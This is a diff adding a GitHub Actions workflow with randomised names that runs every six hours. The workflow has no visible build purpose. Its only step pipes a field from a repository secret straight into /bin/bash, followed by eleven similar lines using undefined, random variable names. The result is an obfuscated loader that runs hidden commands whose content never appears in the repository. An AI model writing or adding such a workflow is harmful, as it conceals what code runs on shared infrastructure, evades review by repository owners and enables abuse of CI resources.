@@ -1,0 +1,30 @@
+name: yuanweigong4578
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '27 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: yuanweigong4578
+        env:
+          w46: ${{ secrets.w46 }}
+        run: |
+          echo $w46 | jq -r .kf5371 | /bin/bash
+          echo $i84 | jq -r .hmd69288 | /bin/bash
+          echo $oprkq8379 | jq -r .alskp7980 | /bin/bash
+          echo $gzu160 | jq -r .kcnvm930 | /bin/bash
+          echo $xjmuy1752 | jq -r .ly60 | /bin/bash
+          echo $qb68 | jq -r .eiq58287 | /bin/bash
+          echo $gqt7809 | jq -r .xwby857 | /bin/bash
+          echo $omd39686 | jq -r .pqqog62 | /bin/bash
+          echo $tdqcb43 | jq -r .yno0325 | /bin/bash
+          echo $dvtu14 | jq -r .cm11158 | /bin/bash
+          echo $mqys54 | jq -r .y37542 | /bin/bash
+          echo $bbq14121 | jq -r .in4 | /bin/bash
+
